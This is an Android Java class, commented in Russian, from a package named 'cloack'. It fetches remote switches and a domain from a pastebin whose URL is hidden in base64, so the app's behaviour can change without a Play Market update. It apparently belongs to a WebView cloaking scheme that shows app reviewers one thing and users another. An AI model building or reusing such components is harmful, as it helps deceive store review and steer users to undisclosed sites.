package com.guide.webview.cloack.request;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

/**
 * Запрос на сервер.(RemoteConfig)
 * Класс отвечает за отправку GET-запрос на сервер, реализован с помощью либы Retrofit
 * RemoteConfig - создается разработчиком, как и данные, которые храняться в нем
 * Пример сервиса RemoteConfig: https://rentry.co
 * Пример данных RemoteConfig: https://rentry.co/3u64p/raw
 * RemoteConfig необходим для изменения поведения приложения без его обновления в Play Market
 */
public class RemoutConfigRequest {
    private RetrofitClient retrofitClient;

    public RemoutConfigRequest(RemoutConfigCallBack remoutConfigCallBack) {
        createRetrofitClient();
        // делаем  запрос на сервер
        RemoutConfugAPI apiServer = retrofitClient.createRequest().create(RemoutConfugAPI.class);
        // указываем dataModel
        Call<RemoutConfigDataModel> call = apiServer.doCall();
        //получаем ответ с сервера
        call.enqueue(new Callback<RemoutConfigDataModel>() {
            // успех
            @Override
            public void onResponse(Call<RemoutConfigDataModel> call, Response<RemoutConfigDataModel> response) {
                //передаем полученные параметры через callBack
                remoutConfigCallBack.getted(response.body().getFirstSwitch(),
                        response.body().getSecondSwitch(),
                        response.body().getDomen());
            }
            // провал
            @Override
            public void onFailure(Call<RemoutConfigDataModel> call, Throwable t) {
                remoutConfigCallBack.isFail();
            }
        });
    }

    /**
     * Создаем клиент retrofit и декодируем базовую ссылку RemoteConfig
     * Например: базовая ссылка - https://rentry.co/3u64p/, конечная ссылка обращения https://rentry.co/3u64p/raw
     */
    public void createRetrofitClient() {
        String baseUrlRemoteConfig = new MyDecoder("aHR0cHM6Ly9yZW50cnkuY28vM3U2NHAv").decode();
        retrofitClient = new RetrofitClient(baseUrlRemoteConfig);
    }
}
